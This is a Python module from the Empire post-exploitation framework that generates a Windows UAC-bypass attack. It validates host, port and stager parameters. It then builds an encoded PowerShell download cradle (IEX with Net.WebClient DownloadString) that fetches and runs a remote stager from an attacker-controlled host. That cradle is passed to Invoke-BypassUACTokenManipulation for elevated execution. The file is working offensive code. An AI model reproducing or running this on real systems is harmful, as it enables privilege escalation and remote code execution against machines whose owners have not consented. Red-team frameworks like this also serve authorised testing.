from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source

MAX_PORT = 65535


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        stager = params["Stager"].strip().lstrip("/")
        port = str(params["Port"]).strip()

        if not port.isascii() or not port.isdigit() or not 1 <= int(port) <= MAX_PORT:
            raise ModuleValidationException(f"Invalid port: {port}")
        # The stager is embedded in a single-quoted PowerShell string. Reject a '
        # that would close it early, and anything non-ASCII (PowerShell also
        # treats the curly quotes U+2018-U+201B as single-quote delimiters) or
        # non-printable (control characters land in the URL verbatim).
        if (
            not stager
            or "'" in stager
            or " " in stager
            or not stager.isascii()
            or not stager.isprintable()
        ):
            raise ModuleValidationException(f"Invalid stager: {params['Stager']}")

        base = helpers.normalize_http_host(params["Host"].strip().rstrip("/"))
        if base is None:
            raise ModuleValidationException(
                f"Host must be a hostname, IP, or http(s)://host with no port or path: {params['Host']}"
            )

        url = f"{base}:{port}/{stager}"
        cradle = f"IEX (New-Object Net.WebClient).DownloadString('{url}')"
        encoded_cradle = helpers.enc_powershell(cradle).decode("ascii")

        script_end = f'Invoke-BypassUACTokenManipulation -Arguments "-w 1 -enc {encoded_cradle}";`n"Invoke-BypassUACTokenManipulation completed!"'

        return script, script_end
